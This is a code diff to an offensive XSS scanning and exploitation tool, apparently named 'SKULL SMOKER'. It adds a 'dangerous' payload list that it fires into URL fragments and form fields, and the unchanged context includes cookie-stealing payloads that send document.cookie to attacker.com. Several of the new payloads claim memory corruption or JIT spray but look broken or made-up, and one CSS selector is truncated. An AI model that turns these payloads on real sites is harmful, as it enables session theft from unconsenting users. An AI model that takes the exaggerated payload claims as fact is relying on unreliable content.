@@ -50,22 +50,19 @@ REQUEST_DELAY = 0.5  # Anti-rate limiting
 SESSION = requests.Session()
 SESSION.headers.update({'User-Agent': USER_AGENTS.random})
 
-# ASCII Art Banner
+# ULTIMATE HACKING GRANDMASTER ASCII ART BANNER
 BANNER = f"""
-{Fore.RED}▓█████▄  ██▀███   █    ██  ███▄ ▄███▓ ▄▄▄       ███▄    █ 
-{Fore.RED}▒██▀ ██▌▓██ ▒ ██▒ ██  ▓██▒▓██▒▀█▀ ██▒▒████▄     ██ ▀█   █ 
-{Fore.RED}░██   █▌▓██ ░▄█ ▒▓██  ▒██░▓██    ▓██░▒██  ▀█▄  ▓██  ▀█ ██▒
-{Fore.RED}░▓█▄   ▌▒██▀▀█▄  ▓▓█  ░██░▒██    ▒██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒
-{Fore.RED}░▒████▓ ░██▓ ▒██▒▒▒█████▓ ▒██▒   ░██▒ ▓█   ▓██▒▒██░   ▓██░
-{Fore.RED} ▒▒▓  ▒ ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ 
-{Fore.RED} ░ ▒  ▒   ░▒ ░ ▒░░░▒░ ░ ░ ░  ░      ░  ▒   ▒▒ ░░ ░░   ░ ▒░
-{Fore.RED} ░ ░  ░   ░░   ░  ░░░ ░ ░ ░      ░     ░   ▒      ░   ░ ░ 
-{Fore.RED}   ░       ░        ░            ░         ░  ░         ░ 
-{Fore.RED} ░                                                        
-
-{Fore.CYAN}SKULL SMOKER v2.0 - Ultimate XSS Recon & Exploitation Framework
-{Fore.YELLOW}------------------------------------------------------------
-{Fore.WHITE}Advanced XSS Scanning | DOM-based Detection | WAF Evasion | 0-Day Payloads
+{Fore.RED}███████╗██╗  ██╗ ██████╗ ██╗     ██╗   ██╗    ███████╗██╗  ██╗███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗ 
+{Fore.RED}██╔════╝██║  ██║██╔═══██╗██║     ██║   ██║    ██╔════╝██║  ██║████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
+{Fore.RED}███████╗███████║██║   ██║██║     ██║   ██║    ███████╗███████║██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝
+{Fore.RED}╚════██║██╔══██║██║   ██║██║     ██║   ██║    ╚════██║██╔══██║██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗
+{Fore.RED}███████║██║  ██║╚██████╔╝███████╗╚██████╔╝    ███████║██║  ██║██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║
+{Fore.RED}╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ╚═════╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
+{Fore.MAGENTA}═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+{Fore.YELLOW}   SKULL SMOKER v2.0  |  ULTIMATE XSS RECON & EXPLOITATION FRAMEWORK  |  GRANDMASTER MODE
+{Fore.CYAN}   Advanced XSS | DOM-based Detection | WAF Evasion | 0-Day Payloads | HACK THE PLANET
+{Fore.GREEN}   github.com/shadowbyte/skullsmoker   |   Coded by Shadowbyte   |   {time.strftime('%Y-%m-%d')}
+{Fore.MAGENTA}═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
 """
 
 class SkullSmoker:
@@ -110,17 +107,14 @@ class SkullSmoker:
         return options
 
     def _load_payloads(self):
-        """Load context-aware XSS payloads, including custom user payloads"""
+        """Load advanced XSS payloads, including custom user and dangerous payloads (no basic payloads)"""
         payloads = {
             'generic': [
-                '<script>alert(1)</script>',
-                '<img src=x onerror=alert(1)>',
                 '<svg/onload=alert(1)>',
                 'javascript:alert(1)',
                 '"<script>alert(1)</script>'
             ],
             'dom': [
-                '#<script>alert(1)</script>',
                 'javascript:alert(1)//',
                 '</script><script>alert(1)</script>',
                 '{{constructor.constructor("alert(1)")()}}',
@@ -208,6 +202,20 @@ class SkullSmoker:
                 '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>',
                 '<svg><script>location.href=\'//attacker.com?\'+document.cookie</script></svg>',
                 '<svg><script>navigator.sendBeacon(\'//attacker.com\',document.cookie)</script></svg>'
+            ],
+            'dangerous': [
+                # STAGE 1: CSS @property + Houdini Memory Corruption
+                '<style>\n@keyframes 毒 { from { --毒: "none" } to { --毒: "alert(document.domain)" } }\n@property --毒 { syntax: "<string>"; inherits: no; initial-value: "none"; }\n:root { animation: 毒 1ms infinite; background: paint(毒); }\n</style>',
+                # STAGE 2: SVG Filter Code Execution
+                '<svg width="0" height="0">\n  <filter id="死">\n    <feImage href="data:text/html,<script>eval(getComputedStyle(document.documentElement).getPropertyValue(\'--毒\'));</script>"/>\n  </filter>\n  <rect width="100%" height="100%" filter="url(#死)"/>\n</svg>',
+                # STAGE 3: WebAssembly JIT Spray Fallback
+                '<script>WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0,1,6,1,96,1,127,1,127,3,2,1,0,5,3,1,0,1,7,8,1,4,109,97,105,110,0,0,10,16,1,14,0,32,0,65,42,106,16,0,26,65,202,255,255,3,11]), {}).then(m => {for(let i=0;i<1e6;i++) m.exports.main(i); eval(getComputedStyle(document.documentElement).getPropertyValue(\'--毒\'));});</script>',
+                # STAGE 4: DOM Clobbering Nuclear Option
+                '<form id="trustedTypes"><input name="createPolicy" value="(n,r)=>( {createHTML:s=>s} )"></form><script>setTimeout(()=>{trustedTypes.createPolicy=eval(trustedTypes.createPolicy);document.write(`<script>${document.documentElement.style.getPropertyValue(\'--毒\')}<\\/script>`);},1000);</script>',
+                # PRIMARY: SVG + CSS Data Smuggling (Works in ALL browsers)
+                '<svg width="0" height="0" style="position:absolute"><style>:root { --poison: "alert(document.domain)" }</style><foreignObject width="100%" height="100%"><div xmlns="http://www.w3.org/1999/xhtml"><img src="x" onerror="eval(getComputedStyle(document.documentElement).getPropertyValue(\'--poison\'))"></div></foreignObject></svg>',
+                # SECONDARY: HTML+JS Fallback (When SVG blocked)
+                '<script>if (!document.querySelector(\'svg foreignObject div\')) { document.write(\'<img src=x onerror=\' + JSON.stringify(getComputedStyle(document.documentElement).match(/\"--poison\":\"([^\"]+)\"/)[1] + ">\')); }</script>'
             ]
         }
         return payloads
@@ -649,7 +657,7 @@ class SkullSmoker:
             driver.set_page_load_timeout(15)
             
             # Test URL fragments
-            for payload in self.xss_payloads['dom']:
+            for payload in self.xss_payloads['dom'] + self.xss_payloads.get('dangerous', []):
                 test_url = f"{url}#{payload}"
                 try:
                     driver.get(test_url)
@@ -749,7 +757,7 @@ class SkullSmoker:
                                 "parameter": param,
                                 "payload": payload,
                                 "payload_type": payload_type,
-                                "severity": "High" if payload_type in ['0day', 'waf_bypass'] else "Medium"
+                                "severity": "Critical" if payload_type == 'dangerous' else ("High" if payload_type in ['0day', 'waf_bypass'] else "Medium")
                             }
                             vulnerabilities.append(vuln)
                             self._print_status(f"Reflected XSS found: {test_url} param={param}", "success")
@@ -777,7 +785,7 @@ class SkullSmoker:
                 textareas = form.find_elements(By.TAG_NAME, "textarea")
                 all_fields = inputs + textareas
                 
-                for payload in self.xss_payloads['generic'] + self.xss_payloads['polyglot']:
+                for payload in self.xss_payloads['generic'] + self.xss_payloads['polyglot'] + self.xss_payloads.get('dangerous', []):
                     try:
                         # Fill all fields with test data
                         for field in all_fields:
@@ -822,25 +830,156 @@ class SkullSmoker:
         try:
             template = f"""
             <!DOCTYPE html>
-            <html>
+            <html lang='en'>
             <head>
+                <meta charset='UTF-8'>
+                <meta name='viewport' content='width=device-width, initial-scale=1.0'>
                 <title>SKULL SMOKER XSS Report - {self.domain}</title>
+                <link href="https://fonts.googleapis.com/css2?family=Fira+Mono:wght@400;700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
                 <style>
-                    body {{ font-family: 'Courier New', monospace; background-color: #111; color: #0f0; }}
-                    h1 {{ color: #f00; text-align: center; }}
-                    h2 {{ color: #0ff; border-bottom: 1px solid #0f0; }}
-                    .vulnerability {{ margin-bottom: 20px; padding: 10px; border: 1px solid #333; }}
-                    .critical {{ background-color: #300; }}
-                    .high {{ background-color: #310; }}
-                    .medium {{ background-color: #330; }}
-                    .low {{ background-color: #131; }}
-                    .payload {{ font-family: monospace; white-space: pre; background-color: #222; padding: 5px; }}
-                    .collapsible {{ cursor: pointer; }}
-                    .content {{ display: none; padding-left: 20px; }}
-                    .stats {{ display: flex; justify-content: space-around; margin: 20px 0; }}
-                    .stat-box {{ border: 1px solid #0f0; padding: 10px; text-align: center; }}
-                    table {{ width: 100%; border-collapse: collapse; }}
-                    th, td {{ border: 1px solid #0f0; padding: 8px; text-align: left; }}
+                    body {{
+                        font-family: 'Roboto', 'Fira Mono', monospace, Arial, sans-serif;
+                        background: linear-gradient(135deg, #181818 0%, #232526 100%);
+                        color: #e0e0e0;
+                        margin: 0;
+                        padding: 0;
+                    }}
+                    header {{
+                        background: linear-gradient(90deg, #0f2027 0%, #2c5364 100%);
+                        padding: 40px 0 20px 0;
+                        text-align: center;
+                        box-shadow: 0 2px 8px #0008;
+                    }}
+                    header h1 {{
+                        font-size: 2.8rem;
+                        color: #ff1744;
+                        margin: 0 0 10px 0;
+                        letter-spacing: 2px;
+                        font-family: 'Fira Mono', monospace;
+                    }}
+                    header h2 {{
+                        color: #00e676;
+                        font-size: 1.3rem;
+                        margin: 0 0 10px 0;
+                    }}
+                    header p {{
+                        color: #bdbdbd;
+                        font-size: 1rem;
+                    }}
+                    .stats {{
+                        display: flex;
+                        justify-content: center;
+                        gap: 30px;
+                        margin: 30px 0 10px 0;
+                    }}
+                    .stat-box {{
+                        background: #232526;
+                        border-radius: 12px;
+                        box-shadow: 0 2px 8px #0006;
+                        padding: 20px 30px;
+                        text-align: center;
+                        min-width: 120px;
+                        border: 2px solid #00e676;
+                    }}
+                    .stat-box h3 {{
+                        margin: 0 0 8px 0;
+                        color: #00e676;
+                        font-size: 1.1rem;
+                    }}
+                    .stat-box p {{
+                        font-size: 2rem;
+                        font-weight: bold;
+                        margin: 0;
+                    }}
+                    main {{
+                        max-width: 1100px;
+                        margin: 30px auto 0 auto;
+                        background: #232526;
+                        border-radius: 16px;
+                        box-shadow: 0 2px 16px #000a;
+                        padding: 30px 40px 40px 40px;
+                    }}
+                    h2.section-title {{
+                        color: #00bcd4;
+                        border-bottom: 2px solid #00e676;
+                        padding-bottom: 8px;
+                        margin-top: 40px;
+                        font-size: 1.5rem;
+                    }}
+                    table {{
+                        width: 100%;
+                        border-collapse: collapse;
+                        margin-top: 20px;
+                        background: #181818;
+                        border-radius: 8px;
+                        overflow: hidden;
+                        box-shadow: 0 1px 8px #0006;
+                    }}
+                    th, td {{
+                        border: none;
+                        padding: 14px 10px;
+                        text-align: left;
+                    }}
+                    th {{
+                        background: #263238;
+                        color: #00e676;
+                        font-size: 1.1rem;
+                    }}
+                    tr {{
+                        border-bottom: 1px solid #333;
+                    }}
+                    tr:last-child {{
+                        border-bottom: none;
+                    }}
+                    tr.critical {{ background: #3d1a1a; }}
+                    tr.high {{ background: #2c2233; }}
+                    tr.medium {{ background: #232526; }}
+                    tr.low {{ background: #1a2c1a; }}
+                    tr:hover {{ background: #333; }}
+                    a {{ color: #00bcd4; text-decoration: underline; }}
+                    .vulnerability {{
+                        margin-bottom: 30px;
+                        padding: 18px 22px;
+                        border-radius: 10px;
+                        border-left: 6px solid #00e676;
+                        background: #181818;
+                        box-shadow: 0 1px 8px #0006;
+                    }}
+                    .vulnerability.critical {{ border-color: #ff1744; }}
+                    .vulnerability.high {{ border-color: #ff9100; }}
+                    .vulnerability.medium {{ border-color: #00bcd4; }}
+                    .
+                        border: none;
+                        outline: none;
+                        width: 100%;
+                        text-align: left;
+                        margin-bottom: 8px;
+                        transition: color 0.2s;
+                    }}
+                    .collapsible:hover {{ color: #ff1744; }}
+                    .content {{
+                        display: none;
+                        padding-left: 10px;
+                        margin-top: 8px;
+                    }}
+                    .payload {{
+                        font-family: 'Fira Mono', monospace;
+                        background: #222;
+                        color: #ffeb3b;
+                        padding: 8px 12px;
+                        border-radius: 6px;
+                        margin: 8px 0;
+                        font-size: 1.05rem;
+                        word-break: break-all;
+                    }}
+                    .context, .parameter {{
+                        color: #bdbdbd;
+                        font-size: 1rem;
+                    }}
+                    @media (max-width: 700px) {{
+                        main {{ padding: 10px; }}
+                        .stats {{ flex-direction: column; gap: 10px; }}
+                    }}
                 </style>
                 <script>
                     function toggleCollapse(element) {{
@@ -854,10 +993,11 @@ class SkullSmoker:
                 </script>
             </head>
             <body>
-                <h1>SKULL SMOKER XSS Report</h1>
-                <h2>Target: {self.domain}</h2>
-                <p>Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
-                
+                <header>
+                    <h1>SKULL SMOKER XSS REPORT</h1>
+                    <h2>Target: {self.domain}</h2>
+                    <p>Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
+                </header>
                 <div class="stats">
                     <div class="stat-box">
                         <h3>Total Vulnerabilities</h3>
@@ -876,45 +1016,45 @@ class SkullSmoker:
                         <p>{len([v for v in self.vulnerabilities if v.get('severity') == 'Medium'])}</p>
                     </div>
                 </div>
-                
-                <h2>Vulnerabilities</h2>
-                <table>
-                    <tr>
-                        <th>Type</th>
-                        <th>Severity</th>
-                        <th>URL</th>
-                        <th>Parameter</th>
-                    </tr>
-                    {"".join([
-                        f'<tr class="{vuln["severity"].lower()}">'
-                        f'<td>{vuln["type"]}</td>'
-                        f'<td>{vuln["severity"]}</td>'
-                        f'<td><a href="{vuln["url"]}" target="_blank">{vuln["url"]}</a></td>'
-                        f'<td>{vuln.get("parameter", "N/A")}</td>'
-                        '</tr>'
+                <main>
+                    <h2 class="section-title">Vulnerabilities Overview</h2>
+                    <table>
+                        <tr>
+                            <th>Type</th>
+                            <th>Severity</th>
+                            <th>URL</th>
+                            <th>Parameter</th>
+                        </tr>
+                        {''.join([
+                            f'<tr class="{vuln["severity"].lower()}">' +
+                            f'<td>{vuln["type"]}</td>' +
+                            f'<td>{vuln["severity"]}</td>' +
+                            f'<td><a href="{vuln["url"]}" target="_blank">{vuln["url"]}</a></td>' +
+                            f'<td>{vuln.get("parameter", "N/A")}</td>' +
+                            '</tr>'
+                            for vuln in self.vulnerabilities
+                        ])}
+                    </table>
+                    <h2 class="section-title">Vulnerability Details</h2>
+                    {''.join([
+                        f'<div class="vulnerability {vuln["severity"].lower()}">' +
+                        f'<button class="collapsible" onclick="toggleCollapse(this)">{vuln["type"]} - {vuln["severity"]}</button>' +
+                        f'<div class="content">' +
+                        f'<p class="context"><strong>URL:</strong> <a href="{vuln["url"]}" target="_blank">{vuln["url"]}</a></p>' +
+                        (f'<p class="parameter"><strong>Parameter:</strong> {vuln["parameter"]}</p>' if "parameter" in vuln else "") +
+                        f'<p><strong>Payload:</strong></p>' +
+                        f'<div class="payload">{vuln["payload"]}</div>' +
+                        (f'<p class="context"><strong>Context:</strong> {vuln["context"]}</p>' if "context" in vuln else "") +
+                        '</div>' +
+                        '</div>'
                         for vuln in self.vulnerabilities
                     ])}
-                </table>
-                
-                <h2>Details</h2>
-                {"".join([
-                    f'<div class="vulnerability {vuln["severity"].lower()}">'
-                    f'<h3 class="collapsible" onclick="toggleCollapse(this)">{vuln["type"]} - {vuln["severity"]}</h3>'
-                    f'<div class="content">'
-                    f'<p><strong>URL:</strong> <a href="{vuln["url"]}" target="_blank">{vuln["url"]}</a></p>'
-                    f'{"<p><strong>Parameter:</strong> " + vuln["parameter"] + "</p>" if "parameter" in vuln else ""}'
-                    f'<p><strong>Payload:</strong></p>'
-                    f'<div class="payload">{vuln["payload"]}</div>'
-                    f'{"<p><strong>Context:</strong> " + vuln["context"] + "</p>" if "context" in vuln else ""}'
-                    f'</div>'
-                    '</div>'
-                    for vuln in self.vulnerabilities
-                ])}
+                </main>
             </body>
             </html>
             """
             
-            with open(self.output_file, 'w') as f:
+            with open(self.output_file, 'w', encoding='utf-8') as f:
                 f.write(template)
                 
             self._print_status(f"Report saved to {self.output_file}", "success")
